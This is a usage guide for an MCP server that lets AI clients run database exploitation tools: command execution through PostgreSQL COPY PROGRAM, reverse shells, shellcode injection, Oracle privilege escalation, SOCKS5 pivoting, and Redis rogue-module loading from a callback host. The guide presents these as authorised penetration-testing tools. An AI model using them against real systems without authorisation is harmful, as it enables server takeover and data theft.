# MDUT MCP Guide

MDUT MCP Server provides database connection, SQL, metadata, and exploitation operations to AI clients through the Model Context Protocol. It currently exposes **35 tools**, all backed by the session-level exploiter cache. Stateful settings such as the PostgreSQL execution method and Redis Module state remain available to subsequent calls.

> Use deployment, command execution, file writes, SOCKS5, and Module features only in environments you are authorized to test.

## Startup

STDIO mode (default):

```bash
go build -tags mcp -o mdut-mcp ./cmd/mcp
./mdut-mcp
```

HTTP SSE mode:

```bash
./mdut-mcp --http --bind 127.0.0.1 --port 16699 --token YOUR_TOKEN
```

Clients should first call `connect` to obtain a `session_id`, then reuse that ID for subsequent tools.

## Tool Inventory

| Category | Tools |
|---|---|
| Connection management (5) | `list_connections`, `list_sessions`, `connect`, `disconnect`, `test_connection` |
| SQL and metadata (6) | `sql_query`, `sql_execute`, `list_databases`, `list_tables`, `list_columns`, `get_ddl` |
| Probing, deployment, and cleanup (5) | `check_exploit_env`, `deploy_exploit`, `cleanup_exploit`, `oracle_priv_report`, `oracle_privesc` |
| Commands, files, and networking (16) | `exec_command`, `list_dir`, `read_file`, `write_file`, `delete_file`, `mk_dir`, `rename_file`, `append_file`, `read_file_chunk`, `file_size`, `hash_file`, `set_pg_exec_method`, `reverse_shell`, `exec_shellcode`, `start_socks5`, `stop_socks5` |
| Redis-specific (3) | `redis_exec`, `redis_deploy_module`, `redis_write_precise` |

## File Operations

`base64_content` for `write_file` and `append_file` must use standard Base64. The handler passes it unchanged to the engine and returns the number of bytes written or appended. `read_file_chunk` returns a Base64 chunk. `offset` must be a nonnegative integer and may be zero; `length` must be a positive integer. Fractional, negative, zero-length, and overflowing values are rejected before the engine is called.

`list_dir` accepts optional `path_charset`; `read_file` and `write_file` accept optional `path_charset` and `content_charset`. All default to `utf-8`, so existing calls require no changes.

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo"}
```

After creating the directory with `mk_dir`, write and append a file:

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/a.bin","base64_content":"YWJj"}
```

`append_file` uses the same argument shape. Read 4 bytes starting at the second byte:

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/a.bin","offset":1,"length":4}
```

Rename, size, and hash:

```json
{"session_id":"SESSION_ID","old_path":"/tmp/mdut-demo/a.bin","new_path":"/tmp/mdut-demo/b.bin"}
```

```json
{"session_id":"SESSION_ID","path":"/tmp/mdut-demo/b.bin"}
```

The last request can be sent to `file_size` or `hash_file`, returning the byte size or SHA256 respectively.

## PostgreSQL Execution Methods

`set_pg_exec_method` accepts only `udf`, `copy_program`, or `libc`, and only for PostgreSQL sessions. The method is stored on the session exploiter; call `exec_command` directly after setting it.

```json
{"session_id":"SESSION_ID","method":"copy_program"}
```

`copy_program` uses `COPY ... PROGRAM` and does not deploy a UDF. The corresponding engine retains the existing `libc` cleanup behavior. Other database session types return a type error.

## SOCKS5 Authentication

`start_socks5` adds optional `user` and `pass` arguments. Leaving both empty retains the original unauthenticated behavior.

```json
{"session_id":"SESSION_ID","bind_addr":"0.0.0.0","port":11080,"user":"proxy-user","pass":"proxy-pass"}
```

`stop_socks5` requires only `session_id`.

## Redis Module Deployment

For Redis sessions, generic `deploy_exploit` forwards to the same Module deployment path as `redis_deploy_module` instead of calling the generic no-op deployment. Both tools support the same optional arguments:

- `module_path`: remote Module path, generated automatically when empty.
- `rogue_host`, `bind_addr`: direct local callback configuration.
- `relay_addr`, `relay_rogue_host`, `relay_rogue_port`: VPS relay configuration.

```json
{"session_id":"SESSION_ID","module_path":"/tmp/system.so","rogue_host":"192.0.2.10","bind_addr":"0.0.0.0:0"}
```

The Redis-specific `redis_deploy_module` accepts the same request body. Cleanup continues to use `cleanup_exploit`.

## Shellcode Behavior

`exec_shellcode` accepts a hexadecimal string. MSSQL/Redis inject shellcode into a subprocess; MySQL/PostgreSQL execute it inside the database process, which can affect database process stability.
